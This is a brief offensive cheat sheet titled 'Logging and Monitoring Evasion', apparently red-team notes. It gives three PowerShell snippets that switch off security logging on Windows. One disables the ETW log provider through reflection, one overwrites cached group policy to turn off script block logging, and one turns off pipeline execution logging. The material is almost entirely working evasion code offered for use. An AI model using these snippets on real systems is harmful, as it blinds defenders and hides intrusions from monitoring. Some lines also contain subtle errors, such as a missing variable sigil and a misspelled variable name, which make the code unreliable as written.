# Logging and Monitoring Evasion

## POWERSHELL REFLECTION

#### 1) 

    $logProvider = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')

    $etwProvider = $logProvider.GetField('etwProvider','NonPublic,Static').GetValue($null)

    [System.Diagnostics.Eventing.EventProvider].GetField('m_enabled','NonPublic, Instance').SetValue(etwProvider,0);

#### 2) Compile to .ps1 script

## GROUP POLICY TAKEOVER

#### 1) 

    $GroupPolicySettingsField = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cachedGroupPolicySettings','NonPublic,Static')

    $GroupPolicySettings = $GroupPolicySettingsField.GetValue($null)

    $GroupPolicySettings['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0

    $GroupPolicyettings['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0

## ABUSING LOG PIPELINE

    $module = Get-Module Microsoft.Powershell.Utility

    $module.LogPipelineExecutionDetails = $false

    $snap = Get-PSSnapin Microsoft.Powershell.Core

    $snap.LogPipelineExecutionDetails = $false
